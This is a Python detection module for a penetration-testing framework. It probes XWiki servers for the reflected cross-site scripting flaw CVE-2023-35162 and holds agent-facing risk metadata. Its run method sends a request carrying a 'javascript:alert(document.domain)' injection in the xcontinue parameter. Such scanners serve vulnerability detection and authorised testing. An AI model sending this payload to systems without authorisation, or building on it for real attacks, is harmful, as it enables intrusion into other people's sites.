#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XWiki Platform is vulnerable to reflected XSS via the previewactions template."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'XWiki < 14.10.5 - Cross-Site Scripting Detection',
        'description': 'XWiki Platform is vulnerable to reflected XSS via the previewactions template. An attacker can inject JavaScript through the xcontinue parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xwiki', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://jira.xwiki.org/browse/XWIKI-20342',
            'https://github.com/xwiki/xwiki-platform/blob/244dbbaa0738a0c40b19929c0369c8b62ae5236e/xwiki-platform-core/xwiki-platform-flamingo/xwiki-platform-flamingo-skin/xwiki-platform-flamingo-skin-resources/src/main/resources/flamingo/previewactions.vm#L48',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-35162',
        ],
        'cve': 'CVE-2023-35162',
    }

    def run(self):
        path = '/xwiki/bin/get/FlamingoThemes/Cerulean?xpage=xpart&vm=previewactions.vm&xcontinue=javascript:alert(document.domain)'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('previewactions.vm',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason='XWiki < 14.10.5 - Cross-Site Scripting detected',
                path=path,
            )
            return True
        return False

